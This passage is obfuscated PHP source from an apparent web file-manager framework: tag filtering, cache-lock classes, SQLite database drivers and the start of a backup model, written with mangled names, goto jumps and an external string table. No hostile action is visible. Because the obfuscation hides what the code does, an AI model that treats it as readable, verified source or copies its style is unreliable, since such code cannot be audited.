$f·Äˆ’æƒÄ[395]); $CÔÂŒÜñĞ = array_merge($D‰ ·¯°ª¾, $f®åæ¥ Ó×); goto AÍ×î‡òñğ; A›Ğ•° Ë³: $Bëâ´”—ê = Model($f·Äˆ’æƒÄ[1197])->listSource($c‹ßÑÁÏ® ); if (!$Bëâ´”—ê || count($E¬óË¾Ÿ†) == $Bëâ´”—ê[$f·Äˆ’æƒÄ[364]][$f·Äˆ’æƒÄ[365]]) { return $Bëâ´”—ê; } $BğÏÄÏ“ãé = array(); goto cñéÆ©ˆ†¹; FÆÃ‚¥Úê…: $B­Å¢›áßŠ = array(); foreach ($e†ëèƒ£†Í as $f‚´ïõ‰) { $C©ÆŞ·ÓšÖ = $f‚´ïõ‰[$f·Äˆ’æƒÄ[76]]; if (!$C©ÆŞ·ÓšÖ) { continue; } if (!isset($B­Å¢›áßŠ[$C©ÆŞ·ÓšÖ])) { $B­Å¢›áßŠ[$C©ÆŞ·ÓšÖ] = array(); } $B­Å¢›áßŠ[$C©ÆŞ·ÓšÖ][] = $f‚´ïõ‰[$f·Äˆ’æƒÄ[419]]; } $E¬óË¾Ÿ† = array(); goto E‰¢¹âš±‡; aÜµÇ·ˆÕÏ: $f·Äˆ’æƒÄ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($bß®ì×„’ && !is_array($bß®ì×„’)) { $bß®ì×„’ = array($bß®ì×„’); } $e†ëèƒ£†Í = $this->listData($d‰Ì¦ñ¬Ú); goto FÆÃ‚¥Úê…; E‰¢¹âš±‡: foreach ($B­Å¢›áßŠ as $CæÈå‘§·ù => $C‰ƒ´„Õƒœ) { $D÷ô˜¼ìÖ– = !0; if (!$bß®ì×„’) { $E¬óË¾Ÿ†[] = $CæÈå‘§·ù; continue; } foreach ($bß®ì×„’ as $FÎÒçÆÅ´‘) { if (!in_array($FÎÒçÆÅ´‘, $C‰ƒ´„Õƒœ)) { $D÷ô˜¼ìÖ– = !1; break; } } if ($D÷ô˜¼ìÖ–) { $E¬óË¾Ÿ†[] = $CæÈå‘§·ù; } } if (!$E¬óË¾Ÿ†) { return array(); } $c‹ßÑÁÏ®  = array($f·Äˆ’æƒÄ[410] => array($f·Äˆ’æƒÄ[411], $E¬óË¾Ÿ†), $f·Äˆ’æƒÄ[484] => $d‰Ì¦ñ¬Ú, $f·Äˆ’æƒÄ[404] => SourceModel::TYPE_GROUP); goto A›Ğ•° Ë³; AÍ×î‡òñğ: foreach ($E¬óË¾Ÿ† as $C©ÆŞ·ÓšÖ) { if (!in_array($C©ÆŞ·ÓšÖ, $CÔÂŒÜñĞ)) { $BğÏÄÏ“ãé[] = $C©ÆŞ·ÓšÖ; } } if ($BğÏÄÏ“ãé) { $this->removeBySource($d‰Ì¦ñ¬Ú, $BğÏÄÏ“ãé); } return $Bëâ´”—ê; goto aå’Ùãº ; aå’Ùãº : } protected function listData($aĞáÑ¢ä…) { $BˆÆ©‹ÓÈ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Fœ¬Èçñ’§ = array($BˆÆ©‹ÓÈ[1509] => 0, $BˆÆ©‹ÓÈ[463] => array($BˆÆ©‹ÓÈ[1787], 0), $BˆÆ©‹ÓÈ[415] => $BˆÆ©‹ÓÈ[1788] . $aĞáÑ¢ä…); $aæ¨…šß¿ğ = $BˆÆ©‹ÓÈ[1789]; $FÀ³…´ò· = $this->field($aæ¨…šß¿ğ)->where($Fœ¬Èçñ’§)->order($BˆÆ©‹ÓÈ[1790])->select(); return $FÀ³…´ò· ? $FÀ³…´ò· : array(); } protected function addToTag($dß×ÁĞ‰í©, $CïÊ¿¼Òã, $dÊàö¼¦ˆ) { $dà„°Ó£Ò” =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->getByTagID($dß×ÁĞ‰í©, $dÊàö¼¦ˆ) || !$CïÊ¿¼Òã) { return !1; } if (!Model($dà„°Ó£Ò”[782])->pathInfo($CïÊ¿¼Òã)) { return !1; } $DóÈØ’¥õ = array($dà„°Ó£Ò”[1509] => 0, $dà„°Ó£Ò”[463] => $dÊàö¼¦ˆ, $dà„°Ó£Ò”[414] => $CïÊ¿¼Òã, $dà„°Ó£Ò”[415] => $dà„°Ó£Ò”[1791] . $dß×ÁĞ‰í©, $dà„°Ó£Ò”[413] => $dà„°Ó£Ò”[33], $dà„°Ó£Ò”[1685] => 0); if ($this->where($DóÈØ’¥õ)->find()) { return !1; } return $this->add($DóÈØ’¥õ); } protected function removeFromTag($aõ¡›Ùà…ò, $f´Ú‹ÀÛ š, $cËíØºÚÍ) { $AŠ İÇè =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->getByTagID($aõ¡›Ùà…ò, $cËíØºÚÍ) || !$f´Ú‹ÀÛ š) { return !1; } if (is_array($f´Ú‹ÀÛ š)) { $f´Ú‹ÀÛ š = array($AŠ İÇè[7], $f´Ú‹ÀÛ š); } $fí§ˆ¨»áõ = array($AŠ İÇè[1509] => 0, $AŠ İÇè[463] => $cËíØºÚÍ, $AŠ İÇè[415] => $AŠ İÇè[1791] . $aõ¡›Ùà…ò, $AŠ İÇè[414] => $f´Ú‹ÀÛ š); return $this->where($fí§ˆ¨»áõ)->delete(); } protected function removeByTag($bŸÜœÔ¯í›, $c½²ô …öß) { $bõÂ¢Áî’ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$this->getByTagID($bŸÜœÔ¯í›, $c½²ô …öß)) { return !1; } $E¹¥±ŒÏË… = array($bõÂ¢Áî’[1509] => 0, $bõÂ¢Áî’[463] => $c½²ô …öß, $bõÂ¢Áî’[415] => $bõÂ¢Áî’[1791] . $bŸÜœÔ¯í›); return $this->where($E¹¥±ŒÏË…)->delete(); } protected function removeBySource($E˜‹â¼§Äô, $Bï¶ †»Ñ) { $C„£Ì†œŒ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$E˜‹â¼§Äô || !$Bï¶ †»Ñ) { return !1; } if (is_array($Bï¶ †»Ñ)) { $Bï¶ †»Ñ = array($C„£Ì†œŒ[7], $Bï¶ †»Ñ); } $a·—¸òøØ = array($C„£Ì†œŒ[1509] => 0, $C„£Ì†œŒ[414] => $Bï¶ †»Ñ, $C„£Ì†œŒ[463] => array($C„£Ì†œŒ[962], 0), $C„£Ì†œŒ[415] => $C„£Ì†œŒ[1791] . $E˜‹â¼§Äô); return $this->where($a·—¸òøØ)->delete(); } } goto c«à“ğó¥Ò; AÒƒ­É“Æî: class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $fç–äíË‹¤ =& $_SERVER[ÒÆ›ÆØÎ¾]; $e‹Ü…¸ßŒ = $GLOBALS[$fç–äíË‹¤[6]][$fç–äíË‹¤[347]]; self::$cachePath = $e‹Ü…¸ßŒ[$fç–äíË‹¤[193]][$fç–äíË‹¤[76]]; @mkdir(self::$cachePath, 511, !0); } public function lock($eØ”Å®œù, $BÓ›»Ó·Ş· = 0) { goto B‚¼©Æ‰ŠŞ; eÜööƒ½ÀĞ: $c²Š¸©±§§ = rtrim(self::$cachePath, $B†Â˜Äìå[8]) . $B†Â˜Äìå[817] . md5($eØ”Å®œù) . $B†Â˜Äìå[814]; if (file_exists($c²Š¸©±§§) && filemtime($c²Š¸©±§§) && filemtime($c²Š¸©±§§) < time() - 10) { @unlink($c²Š¸©±§§); } do { if (file_exists($c²Š¸©±§§)) { cacheLockWait(); continue; } $aÇ‘½¯¦Åš = fopen($c²Š¸©±§§, $B†Â˜Äìå[818]); if (!$aÇ‘½¯¦Åš) { return !1; } $Aç²îè®‰ = flock($aÇ‘½¯¦Åš, LOCK_EX | LOCK_NB); self::$caches[$eØ”Å®œù] = array($B†Â˜Äìå[819] => $aÇ‘½¯¦Åš, $B†Â˜Äìå[193] => $c²Š¸©±§§); fwrite($aÇ‘½¯¦Åš, $A¢‘Å¬àÆ); clearstatcache(); if ($aÇ‘½¯¦Åš && $Aç²îè®‰) { return !0; } cacheLockWait(); } while (microtime(!0) < $A¢‘Å¬àÆ); goto CĞ©ÓØéÔ„; CĞ©ÓØéÔ„: $this->unlock($eØ”Å®œù); return !1; goto F¡›ö½Ößè; B‚¼©Æ‰ŠŞ: $B†Â˜Äìå =& $_SERVER[ÒÆ›ÆØÎ¾]; $a®±›‘¯Ò¢ = microtime(!0); $A¢‘Å¬àÆ = $a®±›‘¯Ò¢ + $BÓ›»Ó·Ş· + 0.0001; goto eÜööƒ½ÀĞ; F¡›ö½Ößè: } public function lockGet($A¡·ÕÇ®´µ) { $e…¤‹¤Œ–° =& $_SERVER[ÒÆ›ÆØÎ¾]; $c™†¤Šƒ‹Š = rtrim(self::$cachePath, $e…¤‹¤Œ–°[8]) . $e…¤‹¤Œ–°[817] . md5($A¡·ÕÇ®´µ) . $e…¤‹¤Œ–°[814]; return file_exists($c™†¤Šƒ‹Š); } public function unlock($CàËœË’‡ô) { goto fñò¼ºÍó®; Dò«Úì³‹è: unset(self::$caches[$CàËœË’‡ô]); goto bÚ˜‘‘Ôƒ; BÛ¬ÅïÖ…è: @flock($FŸšàŒç‰¬[$fÔŒã™¬½Œ[819]], LOCK_UN); @fclose($FŸšàŒç‰¬[$fÔŒã™¬½Œ[819]]); @unlink($FŸšàŒç‰¬[$fÔŒã™¬½Œ[193]]); goto Dò«Úì³‹è; fñò¼ºÍó®: $fÔŒã™¬½Œ =& $_SERVER[ÒÆ›ÆØÎ¾]; $FŸšàŒç‰¬ = self::$caches[$CàËœË’‡ô]; if (!$FŸšàŒç‰¬) { return; } goto BÛ¬ÅïÖ…è; bÚ˜‘‘Ôƒ: } } class CacheLockRedis { public function lock($DĞì–º›Ä¼, $bè‹²á¾‘è = 10) { $EÙ†âÄîÙÕ = Cache::init(); $BĞ‡Ä„ëİĞ = microtime(!0) + $bè‹²á¾‘è; while (microtime(!0) < $BĞ‡Ä„ëİĞ) { $E¤Á…ò¢ÉŞ = $EÙ†âÄîÙÕ->get($DĞì–º›Ä¼); if (!$E¤Á…ò¢ÉŞ) { $béÕñÇ´Çö = $EÙ†âÄîÙÕ->setLock($DĞì–º›Ä¼, $BĞ‡Ä„ëİĞ, $bè‹²á¾‘è); if ($béÕñÇ´Çö) { return !0; } } else { if ($E¤Á…ò¢ÉŞ < microtime(!0)) { $EÙ†âÄîÙÕ->set($DĞì–º›Ä¼, $BĞ‡Ä„ëİĞ, $bè‹²á¾‘è * 2); if ($EÙ†âÄîÙÕ->get($DĞì–º›Ä¼) === $E¤Á…ò¢ÉŞ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($bê¡ßÆ×ƒ¢) { return Cache::init()->get($bê¡ßÆ×ƒ¢); } public function unlock($c“¨ù„¸¼) { return Cache::init()->remove($c“¨ù„¸¼); } } class CacheLockMemcached { public function lock($d’ĞîÙéĞÑ, $B±¯‚Ç‘‘Í = 0) { $c©ôêèŞ¼ = Cache::init(); $D„³Ë¶ŒÉò = microtime(!0) + $B±¯‚Ç‘‘Í; while (microtime(!0) < $D„³Ë¶ŒÉò) { $C³ÄŒ’ÎËª = $c©ôêèŞ¼->get($d’ĞîÙéĞÑ); if (!$C³ÄŒ’ÎËª || $C³ÄŒ’ÎËª < microtime(!0)) { $f—Ú¶İ‡®¼ = $c©ôêèŞ¼->handle->add($d’ĞîÙéĞÑ, $D„³Ë¶ŒÉò, $B±¯‚Ç‘‘Í); if ($f—Ú¶İ‡®¼) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($DŸøÑ³ó¥ñ) { return Cache::init()->get($DŸøÑ³ó¥ñ); } public function unlock($Dø¾í˜ÒÂ‘) { return Cache::init()->remove($Dø¾í˜ÒÂ‘); } } goto bÓ‹­ƒëØ; E½»å¯‡: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { goto d†¾¼¦ƒ„; bº×©ƒÄÈ¢: $this->in =& $in; $this->values[$FãÃˆâÛæØ[6]] =& $config; $this->values[$FãÃˆâÛæØ[7]] =& $in; goto Eøã³‚˜Ê’; d†¾¼¦ƒ„: $FãÃˆâÛæØ =& $_SERVER[ÒÆ›ÆØÎ¾]; global $in, $config; $this->config =& $config; goto bº×©ƒÄÈ¢; Eøã³‚˜Ê’: $this->tpl = TEMPLATE . MOD . $FãÃˆâÛæØ[8]; $this->_classObjectID = mt_rand(0, 10000); goto dÓ›Ù¢‚“Ç; dÓ›Ù¢‚“Ç: } public function loadClass($B”÷÷ï) { if (1 === func_num_args()) { $this->{$B”÷÷ï} = new $B”÷÷ï(); } else { $Fç‰‡´ª­ = new ReflectionClass($B”÷÷ï); $C™âŠ›ƒ… = func_get_args(); array_shift($C™âŠ›ƒ…); $this->{$B”÷÷ï} = $Fç‰‡´ª­->newInstanceArgs($C™âŠ›ƒ…); } return $this->{$B”÷÷ï}; } protected function assign($F–±•àï©Ï, $f¡Šå­¤äã) { $this->values[$F–±•àï©Ï] = $f¡Šå­¤äã; } protected function display($D±èâ£°’³) { ob_end_clean(); extract($this->values); require $this->tpl . $D±èâ£°’³; } } class DbSqliteBase extends Db { public function __construct($A²ª¸Ï§Îç = '') { $A–ÈÂ½½ø¦ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!extension_loaded($A–ÈÂ½½ø¦[9])) { think_exception(think_lang($A–ÈÂ½½ø¦[10]) . $A–ÈÂ½½ø¦[11]); } if (!empty($A²ª¸Ï§Îç)) { if (!isset($A²ª¸Ï§Îç[$A–ÈÂ½½ø¦[12]])) { $A²ª¸Ï§Îç[$A–ÈÂ½½ø¦[12]] = 438; } $this->config = $A²ª¸Ï§Îç; if (empty($this->config[$A–ÈÂ½½ø¦[13]])) { $this->config[$A–ÈÂ½½ø¦[13]] = array(); } } } public function connect($Aèí²øÊÎ™ = '', $CÍÒ ‹µÅË = 0) { $DŒíÙô¨‹Ö =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!isset($this->linkID[$CÍÒ ‹µÅË])) { goto fÎÏ´œôô; fÎÏ´œôô: if (empty($Aèí²øÊÎ™)) { $Aèí²øÊÎ™ = $this->config; } $aÁö‚®£ = !empty($Aèí²øÊÎ™[$DŒíÙô¨‹Ö[13]][$DŒíÙô¨‹Ö[14]]) ? $Aèí²øÊÎ™[$DŒíÙô¨‹Ö[13]][$DŒíÙô¨‹Ö[14]] : $this->pconnect; $d¼ñ–ÏÕä = $aÁö‚®£ ? $DŒíÙô¨‹Ö[15] : $DŒíÙô¨‹Ö[16]; goto f‚İÌ†­Æ¯; Cöš³Ü£Ø„: @sqlite_busy_timeout($this->linkID[$CÍÒ ‹µÅË], 30000); if (1 != think_config($DŒíÙô¨‹Ö[18])) { unset($this->config); } goto B¸§…Õ–ÇË; f‚İÌ†­Æ¯: $this->linkID[$CÍÒ ‹µÅË] = $d¼ñ–ÏÕä($Aèí²øÊÎ™[$DŒíÙô¨‹Ö[17]], $Aèí²øÊÎ™[$DŒíÙô¨‹Ö[12]]); if (!$this->linkID[$CÍÒ ‹µÅË]) { think_exception(sqlite_error_string()); } $this->connected = !0; goto Cöš³Ü£Ø„; B¸§…Õ–ÇË: } return $this->linkID[$CÍÒ ‹µÅË]; } public function free() { $this->queryID = null; } public function query($d§ÚÑë‰º¾) { goto Aã¢­¾²ÌŸ; dáãÛ¹†ÒÊ: think_status($cé¬¹ÜÊƒÏ[20]); $this->queryID = sqlite_query($this->_linkID, $d§ÚÑë‰º¾); $this->debug(); goto DÒÊ¿öõŠÍ; Aã¢­¾²ÌŸ: $cé¬¹ÜÊƒÏ =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto aµòìï×‡ö; DÒÊ¿öõŠÍ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $Fæ¡÷‘Œàˆ = $this->getAll(); return $Fæ¡÷‘Œàˆ; } goto BÂ„æÂÍàŞ; aµòìï×‡ö: $this->queryStr = $d§ÚÑë‰º¾; if ($this->queryID) { $this->free(); } think_action_status($cé¬¹ÜÊƒÏ[19], 1); goto dáãÛ¹†ÒÊ; BÂ„æÂÍàŞ: } public function execute($DÈ·ÄÊ§Ì) { goto CºÚµ¥ğÄˆ; EÎ¹¯ëòÑˆ: if (!1 === $bÔ’ŠÆ‰åñ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } goto B¤ğÓÙñàî; Fê·˜ç…˜: $this->queryStr = $DÈ·ÄÊ§Ì; if ($this->queryID) { $this->free(); } think_action_status($d×†Àë‘[21], 1); goto CÈ®‹¼ùáĞ; CÈ®‹¼ùáĞ: think_status($d×†Àë‘[20]); $bÔ’ŠÆ‰åñ = sqlite_exec($this->_linkID, $DÈ·ÄÊ§Ì); $this->debug(); goto EÎ¹¯ëòÑˆ; CºÚµ¥ğÄˆ: $d×†Àë‘ =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto Fê·˜ç…˜; B¤ğÓÙñàî: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[ÒÆ›ÆØÎ¾][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ešã®ŠÍã« = sqlite_query($this->_linkID, $_SERVER[ÒÆ›ÆØÎ¾][23]); if (!$ešã®ŠÍã«) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $e‡öñ¼Ï = sqlite_query($this->_linkID, $_SERVER[ÒÆ›ÆØÎ¾][24]); if (!$e‡öñ¼Ï) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $B‰±º§ ¾ = array(); if ($this->numRows > 0) { for ($CºÑ‘Ó©² = 0; $CºÑ‘Ó©² < $this->numRows; $CºÑ‘Ó©²++) { $B‰±º§ ¾[$CºÑ‘Ó©²] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $B‰±º§ ¾; } public function getFields($B‘¡ê¡œÆ) { $bôõ¤ù‘ª =& $_SERVER[ÒÆ›ÆØÎ¾]; $D‰÷Ÿ”ŒùÎ = $this->query($bôõ¤ù‘ª[25] . $B‘¡ê¡œÆ . $bôõ¤ù‘ª[26]); $b–®Ö•ìÖ = array(); if ($D‰÷Ÿ”ŒùÎ) { foreach ($D‰÷Ÿ”ŒùÎ as $B³ì„¿…¡ => $f¦à ·¬) { $b–®Ö•ìÖ[$f¦à ·¬[$bôõ¤ù‘ª[27]]] = array($bôõ¤ù‘ª[28] => $f¦à ·¬[$bôõ¤ù‘ª[27]], $bôõ¤ù‘ª[29] => $f¦à ·¬[$bôõ¤ù‘ª[30]], $bôõ¤ù‘ª[31] => (bool) ($f¦à ·¬[$bôõ¤ù‘ª[32]] === $bôõ¤ù‘ª[33]), $bôõ¤ù‘ª[34] => $f¦à ·¬[$bôõ¤ù‘ª[35]], $bôõ¤ù‘ª[36] => strtolower($f¦à ·¬[$bôõ¤ù‘ª[37]]) == $bôõ¤ù‘ª[38], $bôõ¤ù‘ª[39] => strtolower($f¦à ·¬[$bôõ¤ù‘ª[40]]) == $bôõ¤ù‘ª[41]); } } return $b–®Ö•ìÖ; } public function getTables($añŒö¯Æ×Ã = '') { $eİÔœåíéì =& $_SERVER[ÒÆ›ÆØÎ¾]; $e‡ßÌâĞÚ« = $this->query($eİÔœåíéì[42] . $eİÔœåíéì[43] . $eİÔœåíéì[44]); $Aà®³Ö³æ‘ = array(); foreach ($e‡ßÌâĞÚ« as $E‹óŞ‘×Ö => $E«Ì¯¡¹Š) { $Aà®³Ö³æ‘[$E‹óŞ‘×Ö] = current($E«Ì¯¡¹Š); } return $Aà®³Ö³æ‘; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $c§ß®ê³ì =& $_SERVER[ÒÆ›ÆØÎ¾]; $cï±åù…ÑÎ = sqlite_last_error($this->_linkID); $this->error = $cï±åù…ÑÎ . $c§ß®ê³ì[4] . sqlite_error_string($cï±åù…ÑÎ); if ($c§ß®ê³ì[33] != $this->queryStr) { $this->error .= LNG($c§ß®ê³ì[45]) . $this->queryStr; } think_trace($this->error, $c§ß®ê³ì[33], $c§ß®ê³ì[46]); return $this->error; } public function escapeString($f»³¤ŞÇ¶’) { return sqlite_escape_string($f»³¤ŞÇ¶’); } public function parseLimit($DÌŠƒÂÁ•º) { $cìˆ•ÜíîÀ =& $_SERVER[ÒÆ›ÆØÎ¾]; $B¼°·¿ŸäÛ = $cìˆ•ÜíîÀ[33]; if (!empty($DÌŠƒÂÁ•º)) { $DÌŠƒÂÁ•º = explode($cìˆ•ÜíîÀ[47], $DÌŠƒÂÁ•º); if (count($DÌŠƒÂÁ•º) > 1) { $B¼°·¿ŸäÛ .= $cìˆ•ÜíîÀ[48] . $DÌŠƒÂÁ•º[1] . $cìˆ•ÜíîÀ[49] . $DÌŠƒÂÁ•º[0] . $cìˆ•ÜíîÀ[50]; } else { $B¼°·¿ŸäÛ .= $cìˆ•ÜíîÀ[48] . $DÌŠƒÂÁ•º[0] . $cìˆ•ÜíîÀ[50]; } } return $B¼°·¿ŸäÛ; } } class DbSqlite3Base extends Db { public function __construct($c†™å¹øô = '') { $a¿…‡¶õ·ƒ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!class_exists($a¿…‡¶õ·ƒ[51])) { think_exception(think_lang($a¿…‡¶õ·ƒ[10]) . $a¿…‡¶õ·ƒ[52]); } if (!empty($c†™å¹øô)) { if (!isset($c†™å¹øô[$a¿…‡¶õ·ƒ[12]])) { $c†™å¹øô[$a¿…‡¶õ·ƒ[12]] = 438; } $this->config = $c†™å¹øô; if (empty($this->config[$a¿…‡¶õ·ƒ[13]])) { $this->config[$a¿…‡¶õ·ƒ[13]] = array(); } } } public function connect($Fˆ¿¿Ñ‘Â = '', $C›¾™»Ö¡÷ = 0) { $EÈ™ÆÛ“ó„ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!isset($this->linkID[$C›¾™»Ö¡÷])) { if (empty($Fˆ¿¿Ñ‘Â)) { $Fˆ¿¿Ñ‘Â = $this->config; } $this->linkID[$C›¾™»Ö¡÷] = new SQLite3($Fˆ¿¿Ñ‘Â[$EÈ™ÆÛ“ó„[17]]); if (!$this->linkID[$C›¾™»Ö¡÷]) { think_exception($this->linkID[$C›¾™»Ö¡÷]->lastErrorMsg()); } $this->connected = !0; @$this->linkID[$C›¾™»Ö¡÷]->busyTimeout(30000); if (1 != think_config($EÈ™ÆÛ“ó„[18])) { unset($this->config); } } return $this->linkID[$C›¾™»Ö¡÷]; } public function free() { $this->queryID = null; } public function query($Eã»†¸á˜™) { goto DÒ‚ç¶­×¡; dôƒÃÁì Õ: think_status($DáŞÉáÔƒì[20]); $this->queryID = $this->_linkID->query($Eã»†¸á˜™); $this->debug(); goto FºÍ´Óâæ; DÒ‚ç¶­×¡: $DáŞÉáÔƒì =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto eĞ˜áÃà“‚; FºÍ´Óâæ: if (!1 === $this->queryID) { $this->error(); return !1; } else { $f«Åë­ÙßÎ = $this->getAll(); $this->numRows = count($f«Åë­ÙßÎ); return $f«Åë­ÙßÎ; } goto E¼Ó¸Õ´å®; eĞ˜áÃà“‚: $this->queryStr = $Eã»†¸á˜™; if ($this->queryID) { $this->free(); } think_action_status($DáŞÉáÔƒì[19], 1); goto dôƒÃÁì Õ; E¼Ó¸Õ´å®: } public function execute($AøåÈë¤­é) { goto BÁŠÔëÀ«×; bâïÒœ“Ü·: if (!1 === $EÖĞ’Ş¦³¨) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto f±ØÉ»°Ÿ„; eİöÈ„¡á÷: $this->queryStr = $AøåÈë¤­é; if ($this->queryID) { $this->free(); } think_action_status($d–®Œµá½[21], 1); goto aš›­›†Şƒ; BÁŠÔëÀ«×: $d–®Œµá½ =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto eİöÈ„¡á÷; aš›­›†Şƒ: think_status($d–®Œµá½[20]); $EÖĞ’Ş¦³¨ = $this->_linkID->exec($AøåÈë¤­é); $this->debug(); goto bâïÒœ“Ü·; f±ØÉ»°Ÿ„: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[ÒÆ›ÆØÎ¾][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Aòâ²ØØ¥ = $this->_linkID->query($_SERVER[ÒÆ›ÆØÎ¾][23]); if (!$Aòâ²ØØ¥) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $dßõÑëÌ”á = $this->_linkID->query($_SERVER[ÒÆ›ÆØÎ¾][24]); if (!$dßõÑëÌ”á) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $DÛ©…ˆ£ïÏ = array(); while ($dÍ•ÍÁÅá = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $DÛ©…ˆ£ïÏ[] = $dÍ•ÍÁÅá; } $this->queryID->reset(); return $DÛ©…ˆ£ïÏ; } public function getFields($Aõèâ—²ó) { $d‰Õ‡—¿‚Æ =& $_SERVER[ÒÆ›ÆØÎ¾]; $däÓæÔÊ  = $this->query($d‰Õ‡—¿‚Æ[25] . $Aõèâ—²ó . $d‰Õ‡—¿‚Æ[26]); $bîò­°™èŸ = array(); if ($däÓæÔÊ ) { foreach ($däÓæÔÊ  as $D£×ù¨‡©£ => $E•‘ğ©£óê) { $bîò­°™èŸ[$E•‘ğ©£óê[$d‰Õ‡—¿‚Æ[28]]] = array($d‰Õ‡—¿‚Æ[28] => $E•‘ğ©£óê[$d‰Õ‡—¿‚Æ[28]], $d‰Õ‡—¿‚Æ[29] => $E•‘ğ©£óê[$d‰Õ‡—¿‚Æ[29]], $d‰Õ‡—¿‚Æ[31] => (bool) ($E•‘ğ©£óê[$d‰Õ‡—¿‚Æ[31]] === $d‰Õ‡—¿‚Æ[33]), $d‰Õ‡—¿‚Æ[34] => $E•‘ğ©£óê[$d‰Õ‡—¿‚Æ[53]], $d‰Õ‡—¿‚Æ[36] => (bool) $E•‘ğ©£óê[$d‰Õ‡—¿‚Æ[54]], $d‰Õ‡—¿‚Æ[39] => (bool) $E•‘ğ©£óê[$d‰Õ‡—¿‚Æ[54]]); } } return $bîò­°™èŸ; } public function getTables($D®®ğÛ…Âï = '') { $E¸…À¯¥³ =& $_SERVER[ÒÆ›ÆØÎ¾]; $aøâÆ¡Ë°ö = $this->query($E¸…À¯¥³[42] . $E¸…À¯¥³[43] . $E¸…À¯¥³[44]); $CÖ±÷Â¦Â = array(); foreach ($aøâÆ¡Ë°ö as $FÂçé => $A±í¯ë²í÷) { $CÖ±÷Â¦Â[$FÂçé] = current($A±í¯ë²í÷); } return $CÖ±÷Â¦Â; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $F…ŒËôÇò =& $_SERVER[ÒÆ›ÆØÎ¾]; $this->error = $this->_linkID->lastErrorMsg(); if ($F…ŒËôÇò[33] != $this->queryStr) { $this->error .= LNG($F…ŒËôÇò[45]) . $this->queryStr; } think_trace($this->error, $F…ŒËôÇò[33], $F…ŒËôÇò[46]); return $this->error; } public function escapeString($cİ“•›„œ„) { $B¦çäæ­º =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($this->_linkID) { return $this->_linkID->escapeString($cİ“•›„œ„); } return str_ireplace($B¦çäæ­º[55], $B¦çäæ­º[56], $cİ“•›„œ„); } public function parseLimit($D…õƒ÷Â) { $e˜ÛÏ³ÙŞ  =& $_SERVER[ÒÆ›ÆØÎ¾]; $EÎ§¢©õ†â = $e˜ÛÏ³ÙŞ [33]; if (!empty($D…õƒ÷Â)) { $D…õƒ÷Â = explode($e˜ÛÏ³ÙŞ [47], $D…õƒ÷Â); if (count($D…õƒ÷Â) > 1) { $EÎ§¢©õ†â .= $e˜ÛÏ³ÙŞ [48] . $D…õƒ÷Â[1] . $e˜ÛÏ³ÙŞ [49] . $D…õƒ÷Â[0] . $e˜ÛÏ³ÙŞ [50]; } else { $EÎ§¢©õ†â .= $e˜ÛÏ³ÙŞ [48] . $D…õƒ÷Â[0] . $e˜ÛÏ³ÙŞ [50]; } } return $EÎ§¢©õ†â; } } goto dÀ²”Ò†£Á; Dâíù¦Á: class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\155\56\x62\141\143\x6b\x75\x70\114\x69\163\164"; public $field = array("\x69\x6f", "\x6e\141\155\x65", "\163\x74\x61\164\165\x73", "\x63\157\156\164\x65\156\x74", "\x6d\141\x6e\165\141\x6c", "\162\x65\x73\x75\154\164", "\164\x69\x6d\145\x46\x72\157\x6d", "\164\x69\x6d\145\124\157"); public function config() { goto CÅÏ‘˜¦Êâ; f‰šê‰Ûˆ: $Aš¢Î›íá¸ = Model($CàÇæ±¯‚»[1707])->findByKey($CàÇæ±¯‚»[1506], $Dåî†Ü•§×); if (!$Aš¢Î›íá¸) { $Aš¢Î›íá¸ = array(); } if (isset($Aš¢Î›íá¸[$CàÇæ±¯‚»[197]])) { $Aš¢Î›íá¸[$CàÇæ±¯‚»[197]] = json_decode($Aš¢Î›íá¸[$CàÇæ±¯‚»[197]], !0); } goto C´ƒùÆŒÂ¾; C´ƒùÆŒÂ¾: if (isset($B¸â¨êİÏ[$CàÇæ±¯‚»[197]])) { 